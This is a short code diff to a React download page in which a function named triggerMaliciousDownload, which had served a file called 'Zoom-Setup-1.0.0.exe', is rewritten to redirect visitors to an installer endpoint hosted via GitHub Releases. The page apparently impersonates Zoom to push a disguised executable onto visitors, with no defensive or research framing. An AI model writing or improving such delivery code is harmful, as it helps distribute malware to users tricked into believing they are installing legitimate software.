@@ -36,17 +36,10 @@ const DownloadPage: React.FC = () => {
     }, 200);
   };
 
-  const triggerMaliciousDownload = async () => {
-    // Use API route which handles installer URL (supports external hosting)
-    const installerUrl = '/api/download/installer';
-    
-    // Create a link and trigger download
-    const a = document.createElement('a');
-    a.href = installerUrl;
-    a.download = 'Zoom-Setup-1.0.0.exe';
-    document.body.appendChild(a);
-    a.click();
-    document.body.removeChild(a);
+  const triggerMaliciousDownload = () => {
+    // Direct redirect to API route - server will redirect to GitHub Releases
+    // Browser will automatically follow the redirect and download the file
+    window.location.href = '/api/download/installer';
   };
 
   const systemRequirements = [
